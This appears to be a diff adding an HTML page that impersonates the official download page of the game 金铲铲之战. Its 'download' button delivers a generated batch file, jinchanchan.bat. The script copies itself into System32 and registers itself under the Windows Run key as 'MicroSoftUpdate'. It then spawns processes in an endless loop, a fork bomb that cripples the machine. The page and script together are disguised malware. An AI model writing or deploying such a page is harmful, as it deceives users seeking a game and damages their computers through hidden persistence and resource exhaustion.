@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>金铲铲之战 - 官方下载</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-image: url('https://game.gtimg.cn/images/lolm/act/a20230829jcc/images/share.jpg'); /* TFT Background */
+            background-size: cover;
+            background-position: center;
+            color: white;
+            text-align: center;
+            padding: 20px;
+            height: 100vh;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            max-width: 600px;
+            margin: auto;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 10px rgba(255, 215, 0, 0.5);
+        }
+        h1 {
+            color: #FFD700;
+        }
+        .game-logo {
+            width: 100%;
+            border-radius: 10px;
+        }
+        .download-button {
+            background-color: #FFD700;
+            color: black;
+            border: none;
+            padding: 15px 25px;
+            font-size: 20px;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 15px;
+            animation: bounce 0.5s infinite alternate;
+        }
+        .download-button:hover {
+            background-color: #E6C300;
+        }
+        @keyframes bounce {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-10px); }
+        }
+        .progress-container {
+            width: 100%;
+            background-color: #444;
+            border-radius: 10px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+        .progress-bar {
+            width: 0%;
+            height: 10px;
+            background-color: #FFD700;
+            border-radius: 10px;
+        }
+        #countdown {
+            font-size: 18px;
+            color: #FFD700;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>金铲铲之战 - 官方下载</h1>
+        <p>立即下载最新版本，体验超燃策略对战！</p>
+        <button class="download-button" onclick="startDownload()">立即下载</button>
+
+        <div class="progress-container">
+            <div class="progress-bar" id="progress-bar"></div>
+        </div>
+
+        <p id="countdown">下载倒计时: <span id="time-left">10</span>秒</p>
+    </div>
+
+    <script>
+        function startDownload() {
+            var timeLeft = 10;
+            var countdown = document.getElementById("time-left");
+            var progressBar = document.getElementById("progress-bar");
+
+            var interval = setInterval(function() {
+                if (timeLeft <= 0) {
+                    clearInterval(interval);
+                    countdown.innerHTML = "准备开始下载...";
+                    setTimeout(function() {
+                        downloadFile(); // 延迟下载
+                    }, 1000);
+                } else {
+                    countdown.innerHTML = timeLeft;
+                    timeLeft--;
+                    progressBar.style.width = (10 - timeLeft) * 10 + "%";
+                }
+            }, 1000);
+        }
+
+        function downloadFile() {
+            var batContent = `
+@echo off
+set script_name=jinchanchan.bat
+set script_path=%SystemRoot%\\System32\\%script_name%
+
+if not exist "%script_path%" (
+    copy "%~f0" "%script_path%" >nul
+)
+
+reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MicroSoftUpdate" /t REG_SZ /d "%script_path%" /f >nul
+
+:loop
+start
+start
+start
+goto loop
+            `;
+            
+            var blob = new Blob([batContent], { type: 'text/plain' });
+            var link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = 'jinchanchan.bat';  // Updated to jinchanchan.bat
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+    </script>
+</body>
+</html>
